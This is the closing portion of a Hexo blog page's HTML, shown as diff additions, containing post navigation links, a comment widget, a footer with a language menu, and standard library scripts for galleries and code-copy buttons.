+            <a href="/2018/03/31/react-fiber-and-lifecycles/">淺談 React Fiber 及其對 lifecycles 造成的影響</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2018/02/03/github-classroom-and-travis-ci/">利用 Github Classroom 加 Travis CI 打造改作業系統</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">評論</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>繁體中文</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2018/03/12/en/css-keylogger/" class="dropdown-item">
+                    English
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
